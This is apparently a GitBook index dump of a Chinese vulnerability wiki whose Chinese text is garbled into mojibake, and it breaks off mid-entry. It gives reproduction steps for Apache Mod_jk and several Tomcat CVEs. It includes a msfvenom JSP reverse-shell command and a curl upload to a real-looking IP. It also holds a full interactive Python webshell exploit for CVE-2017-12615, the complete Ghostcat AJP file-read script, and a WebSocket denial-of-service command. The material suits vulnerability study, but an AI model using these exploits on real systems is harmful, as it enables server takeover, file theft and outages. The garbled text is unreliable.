è„šæœ¬åˆ©ç”¨ç¤ºä¾‹ï¼Œä»¥åŠæ‰§è¡Œæ•ˆæœ DES: éƒ¨åˆ†ç‰¹æ®Šè„šæœ¬æ–‡ä»¶çš„ç‰¹æ®Šæè¿° å‚è€ƒæ¥æº ExpHub PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-14 08:40:39 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Mod_jk/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Mod_jk/","title":"Apache Mod_jk","keywords":"","body":"Apache Mod_jk Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-11 11:27:21 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Mod_jk/Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Mod_jk/Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759.html","title":"Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759","keywords":"","body":"Apache Mod_jk è®¿é—®æ§åˆ¶æƒé™ç»•è¿‡ CVE-2018-11759 æ¼æ´æè¿° Apache Tomcat JKï¼ˆmod_jkï¼‰Connectoræ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰è½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€æ¬¾ä¸ºApacheæˆ–IISæä¾›è¿æ¥åå°Tomcatçš„æ¨¡å—ï¼Œç”¨ä»¥ä¸ºApacheæˆ–IISæœåŠ¡å™¨æä¾›å¤„ç†JSP/Servletçš„èƒ½åŠ›ã€‚ ç”±äºhttpdå’ŒTomcatåœ¨è·¯å¾„å¤„ç†è§„èŒƒä¸Šå­˜åœ¨å·®å¼‚ï¼Œå› æ­¤å¯ä»¥ç»•è¿‡Apache mod_jk Connector 1.2.0ç‰ˆæœ¬åˆ°1.2.44ç‰ˆæœ¬ä¸Šç”±JkMount httpdæŒ‡ä»¤æ‰€å®šä¹‰ç«¯ç‚¹çš„è®¿é—®æ§åˆ¶é™åˆ¶ã€‚ å¦‚æœä¸€ä¸ªåªæœ‰åªè¯»æƒé™çš„jkstatusçš„æ¥å£å¯ä»¥è®¿é—®çš„è¯ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½èƒ½å¤Ÿå…¬å¼€ç”±mod_jkæ¨¡å—ç»™AJPæä¾›æœåŠ¡çš„å†…éƒ¨è·¯ç”±ã€‚ å¦‚æœä¸€ä¸ªå…·æœ‰è¯»å†™æƒé™çš„jkstatusæ¥å£å¯ä¾›è®¿é—®ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡ä¿®æ”¹AJPçš„é…ç½®æ–‡ä»¶ä¸­ç›¸å…³é…ç½®æ¥åŠ«æŒæˆ–è€…æˆªæ–­æ‰€æœ‰ç»è¿‡mod_jkçš„æµé‡ï¼Œåˆæˆ–è€…è¿›è¡Œå†…éƒ¨çš„ç«¯å£æ‰«æã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Mod_jk Connector 1.2.0 ~ 1.2.44 ç¯å¢ƒæ­å»º git clone https://github.com/immunIT/CVE-2018-11759.git docker-conpose up -d è®¿é—® http://xxx.xxx.xxx.xxx:80 æˆåŠŸå³å¯ æ¼æ´å¤ç° è®¿é—® http://xxx.xxx.xxx.xxx/jkstatus æ˜¾ç¤ºæ— æƒé™è®¿é—® Forbidden You don't have permission to access /jkstatus on this server. è®¿é—® http://xxx.xxx.xxx.xxx/jkstatus; å³å¯ç»•è¿‡ [!NOTE] æ³¨æ„æ˜¯åœ¨urlåé¢åŠ ä¸Šäº†ä¸€ä¸ª; PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/","title":"Apache Tomcat","keywords":"","body":"Apache Tomcat Apache Tomcat ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2021-24122 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938 Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935 Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-23 13:03:13 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615.html","title":"Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615","keywords":"","body":"Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-12615 æ¼æ´æè¿° 2017å¹´9æœˆ19æ—¥ï¼ŒApache Tomcatå®˜æ–¹ç¡®è®¤å¹¶ä¿®å¤äº†ä¸¤ä¸ªé«˜å±æ¼æ´ï¼Œå…¶ä¸­å°±æœ‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2017-12615)ã€‚å½“ å¯ç”¨äº†HTTP PUTè¯·æ±‚æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼Œå°† readonly åˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼‰ï¼Œæ”»å‡»è€…å°†æœ‰å¯èƒ½å¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ”»å‡»è¯·æ±‚æ•°æ®åŒ…å‘æœåŠ¡å™¨ä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„ JSP æ–‡ä»¶ï¼ŒJSPæ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç å°†èƒ½è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚å¯¼è‡´æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ³„éœ²æˆ–è·å–æœåŠ¡å™¨æƒé™ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Tomcat 7.0.0 - 7.0.81 ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:8080/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° æ¼æ´äº§ç”Ÿçš„ä¸»è¦åŸå› æ¥è‡ªäºconf/web.xmlæ–‡ä»¶é…ç½®é”™è¯¯,readonlyå¼€å¯äº†false,å¯¼è‡´å¯ä»¥ä½¿ç”¨PUT/DELETEè¯·æ±‚æ–¹æ³•æ“ä½œæ–‡ä»¶ msfç”Ÿæˆä¸€ä¸ªjspæœ¨é©¬ msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=9999 -f raw > shell.jsp åˆ©ç”¨PUTæ–¹æ³•ä¸Šä¼ æœ¨é©¬ curl -v -X PUT --data-binary @shell.jsp \"http://81.68.139.186:8080/shell.jsp/\" [!NOTE] æ³¨æ„ http://xxx.xxx.xxx.xxx:8080/shell.jsp/ä¸­çš„æœ€åä¸€ä¸ª\"/\"å­—ç¬¦å¾ˆé‡è¦ å‘ç°æˆåŠŸä¸Šä¼ æœ¨é©¬æ–‡ä»¶ è®¿é—®æ–‡ä»¶å³å¯åå¼¹ä¸€ä¸ªshell ä¹Ÿå¯ä»¥ä½¿ç”¨DELETEè¯·æ±‚æ–¹æ³•åˆ é™¤æ–‡ä»¶ æ¼æ´åˆ©ç”¨POC [!NOTE] ä»£ç åªç”¨äºæ£€æµ‹æ¼æ´ï¼Œåå¼¹shellå‚ç…§ä¸Šæ–¹ #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Apache Tomcat 7.0.0 - 7.0.81 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2017-12615.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8080 \\033[0m') print('+ \\033[36mCmd >>> shell \\033[0m') print('+ \\033[36mCmd >>> exit(é€€å‡ºäº¤äº’å¹¶åˆ é™¤webshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): md5_filename = str(random.randint(1,999)).encode(\"utf-8\") file_name = hashlib.md5(md5_filename).hexdigest() vuln_put_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" \"\"\" try: response = requests.request(\"PUT\", url=vuln_put_url, data=data, headers=headers, timeout=30) if response.status_code == 201 or response.status_code == 201: print(\"\\033[32m[o] å«æœ‰CVE-2017-12615æ¼æ´ï¼ŒæˆåŠŸä¸Šä¼ shellï¼Œæ–‡ä»¶åä¸º{}.jsp,å“åº”ä¸º{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,PUTæ–¹æ³•å…³é—­ \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,PUTæ–¹æ³•å…³é—­ \\033[0m\") sys.exit(0) def POC_2(target_url, file_name, cmd): vuln_cmd_url = target_url + \"/\" + file_name + \".jsp?\" + \"pwd=peiqi&cmd=\" + cmd headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_cmd_url, headers=headers,timeout=30) if response.status_code == 200: print(\"\\033[32m[o] æˆåŠŸæ‰§è¡Œå‘½ä»¤,å“åº”ä¸º:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,å‘½ä»¤æ— æ³•æ‰§è¡Œ \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥,å‘½ä»¤æ— æ³•æ‰§è¡Œ \\033[0m\") sys.exit(0) def POC_3(target_url, file_name): vuln_delect_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.request(\"DELETE\", url=vuln_delect_url, headers=headers, timeout=30) if response.status_code == 200 or 201: print(\"\\033[32m[o] æˆåŠŸåˆ é™¤shellï¼Œæ–‡ä»¶åä¸º{}.jsp,å“åº”ä¸º{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] åˆ é™¤å¤±è´¥ \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] åˆ é™¤å¤±è´¥ \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = POC_1(target_url) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": POC_3(target_url, file_name) sys.exit(0) else: POC_2(target_url, file_name, cmd) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938.html","title":"Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938","keywords":"","body":"Aapache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´ CVE-2020-1938 æ¼æ´æè¿° Java æ˜¯ç›®å‰ Web å¼€å‘ä¸­æœ€ä¸»æµçš„ç¼–ç¨‹è¯­è¨€ï¼Œè€Œ Tomcat æ˜¯å½“å‰æœ€æµè¡Œçš„ Java ä¸­é—´ä»¶æœåŠ¡å™¨ä¹‹ä¸€ï¼Œä»åˆç‰ˆå‘å¸ƒåˆ°ç°åœ¨å·²ç»æœ‰äºŒåå¤šå¹´å†å²ï¼Œåœ¨ä¸–ç•ŒèŒƒå›´å†…å¹¿æ³›ä½¿ç”¨ã€‚ Ghostcatï¼ˆå¹½çµçŒ«ï¼‰ æ˜¯ç”±é•¿äº­ç§‘æŠ€å®‰å…¨ç ”ç©¶å‘˜å‘ç°çš„å­˜åœ¨äº Tomcat ä¸­çš„å®‰å…¨æ¼æ´ï¼Œç”±äº Tomcat AJP åè®®è®¾è®¡ä¸Šå­˜åœ¨ç¼ºé™·ï¼Œæ”»å‡»è€…é€šè¿‡ Tomcat AJP Connector å¯ä»¥è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œä¾‹å¦‚å¯ä»¥è¯»å– webapp é…ç½®æ–‡ä»¶æˆ–æºä»£ç ã€‚æ­¤å¤–åœ¨ç›®æ ‡åº”ç”¨æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„æƒ…å†µä¸‹ï¼Œé…åˆæ–‡ä»¶åŒ…å«çš„åˆ©ç”¨è¿˜å¯ä»¥è¾¾åˆ°è¿œç¨‹ä»£ç æ‰§è¡Œçš„å±å®³ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Tomcat 6 Apache Tomcat 7 Apache Tomcat 8 Apache Tomcat 9 ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:8080/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° ç›®å‰æœ‰å¯é çš„åˆ©ç”¨è„šæœ¬ Gihubå·¥å…·ä¸‹è½½é“¾æ¥ python CNVD-2020-10487-Tomcat-Aj p-lfi.py -p 8009 -f /WEB-INF/web.xml xxx.xxx.xxx.xxx [!NOTE] è„šæœ¬éœ€è¦ä½¿ç”¨python2æ¥è¿è¡Œï¼Œæ­¤æ¼æ´ç”¨äºä¸Šä¼ è·¯å¾„å¯æ§ï¼Œå¼€æ”¾8009ç«¯å£AJPåè®®æƒ…å†µä¸‹é€šè¿‡è¯»å–æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ æ¼æ´åˆ©ç”¨POC https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py #!/usr/bin/env python #CNVD-2020-10487 Tomcat-Ajp lfi #by ydhcui import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string(s): if s is None: return struct.pack(\">h\", -1) l = len(s) return struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \">h\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\">bbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\">H\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\">h\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pack_string(self.req_uri) res += pack_string(self.remote_addr) res += pack_string(self.remote_host) res += pack_string(self.server_name) res += struct.pack(\">h\", self.server_port) res += struct.pack(\"?\", self.is_ssl) res += self.pack_headers() res += self.pack_attributes() if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbh\", 0x12, 0x34, len(res)) else: header = struct.pack(\">bbh\", 0x41, 0x42, len(res)) return header + res def parse(self, raw_packet): stream = StringIO(raw_packet) self.magic1, self.magic2, data_len = unpack(stream, \"bbH\") self.prefix_code, self.method = unpack(stream, \"bb\") self.protocol = unpack_string(stream) self.req_uri = unpack_string(stream) self.remote_addr = unpack_string(stream) self.remote_host = unpack_string(stream) self.server_name = unpack_string(stream) self.server_port = unpack(stream, \">h\") self.is_ssl = unpack(stream, \"?\") self.num_headers, = unpack(stream, \">H\") self.request_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code > 0xA000: h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001] else: h_name = unpack(stream, \"%ds\" % code) stream.read(1) # \\0 h_value = unpack_string(stream) self.request_headers[h_name] = h_value def send_and_receive(self, socket, stream, save_cookies=False): res = [] i = socket.sendall(self.serialize()) if self.method == AjpForwardRequest.POST: return res r = AjpResponse.receive(stream) assert r.prefix_code == AjpResponse.SEND_HEADERS res.append(r) if save_cookies and 'Set-Cookie' in r.response_headers: self.headers['SC_REQ_COOKIE'] = r.response_headers['Set-Cookie'] # read body chunks and end response packets while True: r = AjpResponse.receive(stream) res.append(r) if r.prefix_code == AjpResponse.END_RESPONSE: break elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK: continue else: raise NotImplementedError break return res class AjpResponse(object): _,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7) COMMON_SEND_HEADERS = [ \"Content-Type\", \"Content-Language\", \"Content-Length\", \"Date\", \"Last-Modified\", \"Location\", \"Set-Cookie\", \"Set-Cookie2\", \"Servlet-Engine\", \"Status\", \"WWW-Authenticate\" ] def parse(self, stream): # read headers self.magic, self.data_length, self.prefix_code = unpack(stream, \">HHb\") if self.prefix_code == AjpResponse.SEND_HEADERS: self.parse_send_headers(stream) elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK: self.parse_send_body_chunk(stream) elif self.prefix_code == AjpResponse.END_RESPONSE: self.parse_end_response(stream) elif self.prefix_code == AjpResponse.GET_BODY_CHUNK: self.parse_get_body_chunk(stream) else: raise NotImplementedError def parse_send_headers(self, stream): self.http_status_code, = unpack(stream, \">H\") self.http_status_msg = unpack_string(stream) self.num_headers, = unpack(stream, \">H\") self.response_headers = {} for i in range(self.num_headers): code, = unpack(stream, \">H\") if code H\") self.data = stream.read(self.data_length+1) def parse_end_response(self, stream): self.reuse, = unpack(stream, \"b\") def parse_get_body_chunk(self, stream): rlen, = unpack(stream, \">H\") return rlen @staticmethod def receive(stream): r = AjpResponse() r.parse(stream) return r import socket def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET): fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER) fr.method = method fr.protocol = \"HTTP/1.1\" fr.req_uri = req_uri fr.remote_addr = target_host fr.remote_host = None fr.server_name = target_host fr.server_port = 80 fr.request_headers = { 'SC_REQ_ACCEPT': 'text/html', 'SC_REQ_CONNECTION': 'keep-alive', 'SC_REQ_CONTENT_LENGTH': '0', 'SC_REQ_HOST': target_host, 'SC_REQ_USER_AGENT': 'Mozilla', 'Accept-Encoding': 'gzip, deflate, sdch', 'Accept-Language': 'en-US,en;q=0.5', 'Upgrade-Insecure-Requests': '1', 'Cache-Control': 'max-age=0' } fr.is_ssl = False fr.attributes = [] return fr class Tomcat(object): def __init__(self, target_host, target_port): self.target_host = target_host self.target_port = target_port self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.socket.connect((target_host, target_port)) self.stream = self.socket.makefile(\"rb\", bufsize=0) def perform_request(self, req_uri, headers={}, method='GET', user=None, password=None, attributes=[]): self.req_uri = req_uri self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method)) print(\"Getting resource at ajp13://%s:%d%s\" % (self.target_host, self.target_port, req_uri)) if user is not None and password is not None: self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = \"Basic \" + (\"%s:%s\" % (user, password)).encode('base64').replace('\\n', '') for h in headers: self.forward_request.request_headers[h] = headers[h] for a in attributes: self.forward_request.attributes.append(a) responses = self.forward_request.send_and_receive(self.socket, self.stream) if len(responses) == 0: return None, None snd_hdrs_res = responses[0] data_res = responses[1:-1] if len(data_res) == 0: print(\"No data in response. Headers:%s\\n\" % snd_hdrs_res.response_headers) return snd_hdrs_res, data_res ''' javax.servlet.include.request_uri javax.servlet.include.path_info javax.servlet.include.servlet_path ''' import argparse parser = argparse.ArgumentParser() parser.add_argument(\"target\", type=str, help=\"Hostname or IP to attack\") parser.add_argument('-p', '--port', type=int, default=8009, help=\"AJP port to attack (default is 8009)\") parser.add_argument(\"-f\", '--file', type=str, default='WEB-INF/web.xml', help=\"file path :(WEB-INF/web.xml)\") args = parser.parse_args() t = Tomcat(args.target, args.port) _,data = t.perform_request('/asdf',attributes=[ {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']}, {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]}, {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']}, ]) print('----------------------------') print(\"\".join([d.data for d in data])) å‚è€ƒæ–‡ç«  Githubåœ°å€ å¨èƒé€šå‘Š APACHE TOMCAT æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2020-1938ï¼‰ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Tomcat/Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935.html","title":"Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935","keywords":"","body":"Apache Tomcat WebSocket æ‹’ç»æœåŠ¡æ¼æ´ CVE-2020-13935 æ¼æ´æè¿° 2020å¹´11æœˆ06æ—¥ï¼Œ360CERTç›‘æµ‹å‘ç°@RedTeamPentestingå‘å¸ƒäº†Tomcat WebSokcet æ‹’ç»æœåŠ¡æ¼æ´ çš„åˆ†ææŠ¥å‘Šï¼Œè¯¥æ¼æ´ç¼–å·ä¸º CVE-2020-13935 ï¼Œæ¼æ´ç­‰çº§ï¼šé«˜å± ï¼Œæ¼æ´è¯„åˆ†ï¼š7.5 ã€‚ æœªæˆæƒçš„è¿œç¨‹æ”»å‡»è€…é€šè¿‡å‘é€ å¤§é‡ç‰¹åˆ¶è¯·æ±‚åŒ… åˆ°TomcatæœåŠ¡å™¨ ,å¯é€ æˆæœåŠ¡å™¨åœæ­¢å“åº”å¹¶æ— æ³•æä¾›æ­£å¸¸æœåŠ¡ æ¼æ´å½±å“ [!NOTE] Apache Tomcat 10.0.0-M1-10.0.0-M6 Apache Tomcat 9.0.0.M1-9.0.36 Apache Tomcat 8.5.0-8.5.56 Apache Tomcat 7.0.27-7.0.104 ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d æ¼æ´å¤ç° è®¿é—®ç›®æ ‡ï¼ŒæŸ¥çœ‹ç‰ˆæœ¬æ˜¯å¦åœ¨æ¼æ´ç‰ˆæœ¬èŒƒå›´å†… æŸ¥çœ‹æ”»å‡»å‰çš„å†…å­˜ä½¿ç”¨æƒ…å†µ CVE-2020-13935 EXPåœ°å€ [!NOTE] EXPä½¿ç”¨éœ€è¦GOç¯å¢ƒ å¦‚æœå‡ºç° go: github.com/gorilla/websocket@v1.4.2: Get \"https://proxy.golang.org/github.com/gorilla/websocket/@v/v1.4.2.mod\": dial tcp 172.217.160.81:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond. éœ€è¦ä½¿ç”¨å‘½ä»¤åˆ‡æ¢æº go env -w GOPROXY=https://goproxy.cn ä½¿ç”¨EXPæ”»å‡» tcdos ws://192.168.51.133:8080/examples/websocket/echoStreamAnnotation CPU è´Ÿè·è¶…è½½ï¼ŒæˆåŠŸæ”»å‡» æ¼æ´åˆ©ç”¨POC CVE-2020-13935 EXPåœ°å€ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Shiro/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Shiro/","title":"Apache Shio","keywords":"","body":"Apache Shiro Apache Shiro PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-08 20:19:14 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Shiro/Apache Shiro å°äº1.2.4ååºåˆ—åŒ–æ¼æ´ CVE-2016-4437.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Shiro/Apache Shiro 